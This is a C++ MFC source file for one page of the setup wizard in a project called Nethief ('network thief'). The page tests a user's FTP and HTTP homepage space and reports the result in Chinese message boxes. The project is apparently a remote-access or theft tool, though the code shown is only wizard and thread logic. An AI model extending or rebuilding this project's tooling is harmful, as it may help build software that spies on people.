//Download by http://www.NewXing.com
// WizardPage5.cpp : implementation file
//

#include "stdafx.h"
#include "Nethief.h"
#include "WizardPage5.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWizardPage5 property page

IMPLEMENT_DYNCREATE(CWizardPage5, CPropertyPage)

CWizardPage5::CWizardPage5() : CPropertyPage(CWizardPage5::IDD)
{
	//{{AFX_DATA_INIT(CWizardPage5)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_pHomepageTestThread=NULL;
	m_bTestSucceed=FALSE;
}

CWizardPage5::~CWizardPage5()
{
}

void CWizardPage5::DoDataExchange(CDataExchange* pDX)
{
	CPropertyPage::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWizardPage5)
	DDX_Control(pDX, IDC_EDIT_TEST, m_Edit_Test);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWizardPage5, CPropertyPage)
	//{{AFX_MSG_MAP(CWizardPage5)
	ON_BN_CLICKED(IDC_BUTTON_TEST, OnButtonTest)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWizardPage5 message handlers

BOOL CWizardPage5::OnQueryCancel() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(m_pHomepageTestThread!=NULL)
	{
		unsigned long ExitCode;
		GetExitCodeThread(m_pHomepageTestThread->m_hThread,&ExitCode);
		if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
			return FALSE;
	}
	////////////////////////////////////////////////
	if(MessageBox("网络神偷设置向导未完成设置过程。\r\n\r\n是否想退出本向导？",
		"网络神偷 设置向导",MB_ICONQUESTION|MB_YESNO)==IDNO)
		return FALSE;
	
	return CPropertyPage::OnQueryCancel();
}

LRESULT CWizardPage5::OnWizardNext() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(m_pHomepageTestThread!=NULL)
	{
		unsigned long ExitCode;
		GetExitCodeThread(m_pHomepageTestThread->m_hThread,&ExitCode);
		if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
			return TRUE;
	}
	////////////////////////////////////////////////
	if(!m_bTestSucceed)//如果测试未成功,要提示
	{
		if(MessageBox("如果不对主页空间进行测试，就会无法确定设置内容是否正确和主页空间是否工作正常，这都可能导致本软件不能够正常工作。\r\n\r\n你确定要跳过测试吗？",
			"网络神偷 设置向导",MB_ICONQUESTION|MB_YESNO)==IDNO)
		return TRUE;
	}

	CCommunity* pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	pCommunity->SetFtpServerInfo(4,
		"","","","",
		"","","","",
		"",
		"");
	
	return CPropertyPage::OnWizardNext();
}

LRESULT CWizardPage5::OnWizardBack() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(m_pHomepageTestThread!=NULL)
	{
		unsigned long ExitCode;
		GetExitCodeThread(m_pHomepageTestThread->m_hThread,&ExitCode);
		if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
			return TRUE;
	}
	
	return CPropertyPage::OnWizardBack();
}

void CWizardPage5::OnButtonTest()
{
	// TODO: Add your control notification handler code here
	if(m_pHomepageTestThread!=NULL)
	{
		unsigned long ExitCode;
		GetExitCodeThread(m_pHomepageTestThread->m_hThread,&ExitCode);
		if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
			return;
	}
	////////////////////////////////////////////////
	m_Edit_Test.SetWindowText("");

	pHOMEPAGE_TEST_THREAD_PARAM pstHomepageTest=new HOMEPAGE_TEST_THREAD_PARAM;
	pstHomepageTest->pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	pstHomepageTest->pEdit_Test=&m_Edit_Test;
	pstHomepageTest->pbTestSucceed=&m_bTestSucceed;

	m_pHomepageTestThread=AfxBeginThread(HomepageTestProc,(LPVOID)pstHomepageTest);
	m_pHomepageTestThread->m_bAutoDelete=FALSE;
	return;
}

UINT HomepageTestProc(LPVOID pParam)
{
	pHOMEPAGE_TEST_THREAD_PARAM pstHomepageTest=(pHOMEPAGE_TEST_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstHomepageTest->pCommunity;
	CEdit*			pEdit_Test=pstHomepageTest->pEdit_Test;
	BOOL*			pbTestSucceed=pstHomepageTest->pbTestSucceed;
	delete pParam;
	//////////////////////////////////////////////
	int nRet=pCommunity->HomepageTest(pEdit_Test);
	switch(nRet)
	{
		case 1:
		{
			AfxGetMainWnd()->MessageBox("主页空间工作正常。",
				"网络神偷 设置向导",MB_ICONINFORMATION|MB_OK);
			*pbTestSucceed=TRUE;
			break;
		}
		case -1:
		{
			AfxGetMainWnd()->MessageBox("检查联机状态失败！\r\n\r\n当前未连接到Internet，请在联机后再进行测试。",
				"网络神偷 设置向导",MB_ICONSTOP|MB_OK);
			break;
		}
		case -2:
		{
			AfxGetMainWnd()->MessageBox("以FTP方式登录主页空间失败！\r\n\r\n请检查“FTP服务器的域名或IP地址”、“主页空间的用户名”、“主页空间的密码”设置是否正确。\r\n\r\n如果你确定以上设置均正确无误，那么有可能是主页空间的问题，请与主页空间提供商联系。",
				"网络神偷 设置向导",MB_ICONSTOP|MB_OK);
			break;
		}
		case -3:
		{
			AfxGetMainWnd()->MessageBox("以HTTP方式访问主页失败！\r\n\r\n请检查“你的主页空间的网址”设置是否正确。\r\n\r\n如果你确定以上设置均正确无误，那么有可能是主页空间的问题，请与主页空间提供商联系。",
				"网络神偷 设置向导",MB_ICONSTOP|MB_OK);
			break;
		}
	}
	
	return 0;
}
